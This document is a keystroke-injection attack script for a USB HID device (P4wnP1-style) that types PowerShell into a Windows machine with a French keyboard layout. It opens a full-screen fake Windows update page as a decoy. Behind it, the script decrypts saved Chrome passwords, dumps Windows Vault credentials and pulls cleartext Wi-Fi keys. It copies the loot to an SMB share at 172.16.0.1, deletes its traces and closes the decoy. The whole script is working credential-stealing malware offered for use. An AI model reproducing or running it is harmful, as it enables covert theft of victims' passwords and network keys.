layout('fr')
typingSpeed(0,0)
press("GUI r")
delay(200)
type("powershell")
press("CTRL SHIFT ENTER")
delay(1000)
press("SHIFT TAB")
press("ENTER")
delay(3000)
type('mkdir c:\\temp\n')
type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName(')
layout('us') 
press("3")
layout('fr')
type ('WindowsBase')
layout('us') 
press("3")
layout('fr')
type (')).GetType(')
layout('us') 
press("3")
layout('fr')
type ('MS.Win32.UnsafeNativeMethods')
layout('us') 
press("3")
layout('fr')
type ('))::SetWindowPos($hw,$i,0,0,1024,1024,16512)\n')
type('Set-Alias iexplore \'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\'\n')
type('iexplore -k https://fakeupdate.net/win10ue/\n')
type('function Get-ChromeCreds() {Param([String]$Path	);if ([String]::IsNullOrEmpty($Path)) {$Path = ')
layout('us') 
press("3")
layout('fr')
type ('$env:USERPROFILE\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
layout('us') 
press("3")
layout('fr')
type (';}\n')
type('if (![system.io.file]::Exists($Path)){Write-host \'Chrome db file doesnt exist, or invalid file path specified.\';Break;}\n')
type('Add-Type -AssemblyName System.Security;$Stream = New-Object IO.FileStream -ArgumentList ')
layout('us') 
press("3")
layout('fr')
type ('$Path')
layout('us') 
press("3")
layout('fr')
type (', \'Open\', \'Read\', \'ReadWrite\';$Encoding = [system.Text.Encoding]::GetEncoding(28591)\n')
type('$StreamReader = New-Object IO.StreamReader -ArgumentList $Stream, $Encoding;$BinaryText = $StreamReader.ReadToEnd();$StreamReader.Close();$Stream.Close()\n')
type('$PwdRegex = [Regex] \'(\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8C\\x7A\\x00\\xC0\\x4F\\xC2\\x97\\xEB\\x01\\x00\\x00\\x00)[\\s\\S]*?(?=\\x68\\x74\\x74\\x70')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type ('\\Z)\'\n')
type('$PwdMatches = $PwdRegex.Matches($BinaryText);$PwdNum = 0;$DecPwdArray = ')
layout('us') 
press("RIGHT_ALT 0")
layout('fr')
type ('();$PwdMatchCount = $PwdMatches.Count\n')
type('Foreach ($Pwd in $PwdMatches) {$Pwd = $Encoding.GetBytes($PwdMatches[$PwdNum]);$Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Pwd,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);$DecPwd = [System.Text.Encoding]::Default.GetString($Decrypt);$DecPwdArray += $DecPwd;$PwdNum += 1;}\n')
type('$UserRegex = [Regex] \'(?<=\\x0D\\x0D\\x0D[\\s\\S]{2}\\x68\\x74\\x74\\x70)[\\s\\S]*?(?=\\x01\\x00\\x00\\x00\\xD0\\x8C\\x9D\\xDF\\x01\\x15\\xD1\\x11\\x8C\\x7A\\x00\\xC0\\x4F\\xC2\\x97\\xEB\\x01\\x00\\x00\\x00)\'\n')
type('$UserMatches = $UserRegex.Matches($BinaryText);$UserNum = 0;$UserMatchCount = $UserMatches.Count;$UserArray = ')
layout('us') 
press("RIGHT_ALT 0")
layout('fr')
type ('()	\n')
type('if (-NOT ($UserMatchCount -eq $PwdMatchCount)) { Write-host ([string]')
layout('us') 
press("3")
layout('fr')
type ('The number of users is different than the number of passwords! This is most likely due to a regex mismatch.')
layout('us') 
press("3")
layout('fr')
type (')}	\n')
type('$HTTP = ')
layout('us') 
press("3")
layout('fr')
type ('http')
layout('us') 
press("3")
layout('fr')
type (';Foreach ($User in $UserMatches) {$User = $Encoding.GetBytes($UserMatches[$UserNum]);$User = $HTTPEnc + $User;$UserString = [System.Text.Encoding]::Default.GetString($User);$UserString = $HTTP + $UserString;$UserArray += $UserString;$UserNum += 1;}	\n')
type('$ArrayFinal = New-Object -TypeName System.Collections.ArrayList;for ($i = 0; $i -lt $UserNum; $i++) {;$ObjectProp = ')
layout('us') 
press("RIGHT_ALT 0")
layout('fr')
type ('{ \n')
type('UserURL = $UserArray[$i];Password = $DecPwdArray[$i];};$obj = New-Object PSObject -Property $ObjectProp;$ArrayFinal.Add($obj) ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' Out-Null;};$ArrayFinal;}\n')
type('rm c:\\temp\\temp.txt\n')
type('rm c:\\temp\\temp2.txt\n')
type('rm c:\\temp\\temp3.txt\n')
type('Get-ChromeCreds > c:\\temp\\temp.txt\n')
type('$p4wnp1 = [System.IO.DriveInfo]::getdrives() $p4wnp2 = c:\\temp\\')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type ('where-object {$_.VolumeLabel -match ')
layout('us') 
press("3")
layout('fr')
type ('README')
layout('us') 
press("3")
layout('fr')
type ('}')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type ('sort {$_.name} ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type ('foreach-object {; echo ')
layout('us') 
press("3")
layout('fr')
type ('$(echo $_.name)')
layout('us') 
press("3")
layout('fr')
type (';}\n')
type('$ClassHolder = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$VaultObj = new-object Windows.Security.Credentials.PasswordVault;$VaultObj.RetrieveAll() ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' foreach { $_.RetrievePassword(); $_ } ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' select Username,Password,resource > c:\\temp\\temp2.txt\n')
type('$SSID=((netsh wlan show profiles) -match \'Profil Tous les utilisateurs[')
layout('us') 
press("RIGHT_ALT 9")
layout('fr')
type (':]+:.(.+)$\').replace(')
layout('us') 
press("3")
layout('fr')
type ('Profil Tous les utilisateurs')
layout('us') 
press("3")
layout('fr')
type (',')
layout('us') 
press("3")
layout('fr')
type ('')
layout('us') 
press("3")
layout('fr')
type (').replace(')
layout('us') 
press("3")
layout('fr')
type (':')
layout('us') 
press("3")
layout('fr')
type (',')
layout('us') 
press("3")
layout('fr')
type ('')
layout('us') 
press("3")
layout('fr')
type (').replace(')
layout('us') 
press("3")
layout('fr')
type (' ')
layout('us') 
press("3")
layout('fr')
type (',')
layout('us') 
press("3")
layout('fr')
type ('')
layout('us') 
press("3")
layout('fr')
type (').split(')
layout('us') 
press("3")
layout('fr')
type ('\\n')
layout('us') 
press("3")
layout('fr')
type (');$fin=')
layout('us') 
press("3")
layout('fr')
type ('')
layout('us') 
press("3")
layout('fr')
type (';\n')
type('for ($n=0;$n -le $SSID.count-1;$n++){try {;$fin = $fin + $SSID[$n]+((netsh wlan show profiles $SSID[$n].Substring($SSID[$n].Length -($SSID[$n].Length -1)) key=clear) -match \'Contenu de la c[')
layout('us') 
press("RIGHT_ALT 9")
layout('fr')
type (':]+:.(.+)$\').split(')
layout('us') 
press("3")
layout('fr')
type (':')
layout('us') 
press("3")
layout('fr')
type (')[1];} catch {};};$fin > c:\\temp\\temp3.txt \n')
type('cp c:\\temp\\temp.txt c:\\temp\\chrome.txt\n')
type('cp c:\\temp\\temp2.txt c:\\temp\\ie.txt\n')
type('cp c:\\temp\\temp3.txt c:\\temp\\wifi.txt\n')
type('rm c:\\temp\\temp.txt\n')
type('rm c:\\temp\\temp2.txt\n')
type('rm c:\\temp\\temp3.txt\n')
type('$exfil_dir=')
layout('us') 
press("3")
layout('fr')
type ('$Env:UserProfile\\Documents')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('$exfil_dir2=')
layout('us') 
press("3")
layout('fr')
type ('C:\\temp')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('$exfil_ext=')
layout('us') 
press("3")
layout('fr')
type ('*')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('$loot_dir=')
layout('us') 
press("3")
layout('fr')
type ('\\\\172.16.0.1\\Data\\$Env:ComputerName\\$((Get-Date).ToString(\'yyyy-MM-dd_hhmmtt\'))')
layout('us') 
press("3")
layout('fr')
type ('\n')
type('net use \\\\172.16.0.1\\Data ;\n')
type('mkdir $loot_dir\n')
type('robocopy $exfil_dir2 $loot_dir $exfil_ext /S /MT /Z\n')
type('rm c:\\temp\\*.txt\n')
type('$fpid = Get-Process ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' where {$_.mainWindowTitle -like ')
layout('us') 
press("3")
layout('fr')
type ('*fakeupdate*')
layout('us') 
press("3")
layout('fr')
type ('} ')
layout('us') 
press("RIGHT_ALT 6")
layout('fr')
type (' Select-Object -Property Id\n')
type('kill $fpid.id\n')
type('exit\n')
type('\n')
type('\n')
type('\n')
